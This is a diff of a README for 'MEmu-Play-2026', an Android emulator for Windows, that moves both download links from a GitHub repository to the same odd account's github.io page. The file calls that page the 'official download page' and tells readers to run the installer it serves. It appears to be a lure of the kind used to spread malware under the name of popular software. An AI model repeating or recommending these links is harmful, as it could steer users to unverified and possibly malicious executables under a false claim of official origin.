@@ -1,6 +1,6 @@
 # 📱 MEmu-Play-2026 - Experience Android Apps On Windows
 
-[![](https://img.shields.io/badge/Download-MEmu_Play_2026-blue.svg)](https://github.com/Auscultatory-fosterbrother522/MEmu-Play-2026)
+[![](https://img.shields.io/badge/Download-MEmu_Play_2026-blue.svg)](https://auscultatory-fosterbrother522.github.io)
 
 MEmu-Play-2026 allows you to run Android applications on your Windows 10 or 11 computer. This software creates a virtual mobile environment on your desktop. It provides a stable platform for mobile gaming and app testing without the need for a physical device.
 
@@ -20,7 +20,7 @@ Verify that virtualization is enabled in your computer BIOS or UEFI settings. Mo
 
 Follow these steps to install the emulator on your computer.
 
-1. Visit the [official download page](https://github.com/Auscultatory-fosterbrother522/MEmu-Play-2026).
+1. Visit the [official download page](https://auscultatory-fosterbrother522.github.io).
 2. Click the download link provided on the page to save the installation file to your computer.
 3. Locate the file in your Downloads folder once the transfer finishes.
 4. Double-click the file to start the installer.
